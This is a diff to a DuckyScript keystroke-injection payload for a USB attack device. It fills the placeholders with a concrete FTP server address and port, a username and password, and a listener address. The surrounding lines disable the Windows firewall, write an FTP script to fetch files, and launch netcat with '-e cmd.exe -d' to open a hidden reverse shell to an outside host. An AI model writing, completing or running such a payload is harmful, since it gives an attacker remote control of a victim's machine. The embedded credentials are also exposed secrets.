@@ -18,13 +18,13 @@ DELAY 100
 STRING netsh firewall set opmode disable
 ENTER
 DELAY 2000
-STRING echo open [IP] [PORT] > ftp.txt
+STRING echo open [98.247.220.177] [443] > ftp.txt
 ENTER
 DELAY 100
-STRING echo [USERNAME]>> ftp.txt
+STRING echo [root]>> ftp.txt
 ENTER
 DELAY 100
-STRING echo [PASSWORD]>> ftp.txt
+STRING echo [88Legend]>> ftp.txt
 ENTER
 DELAY 100
 STRING echo bin >> ftp.txt
@@ -43,7 +43,7 @@ ENTER
 DELAY 2000
 GUI r
 DELAY 200
-STRING nc.exe [LISTENER IP] [LISTENER PORT] -e cmd.exe -d
+STRING nc.exe [10.0.0.15] [443] -e cmd.exe -d
 ENTER
 DELAY 2000
 GUI r
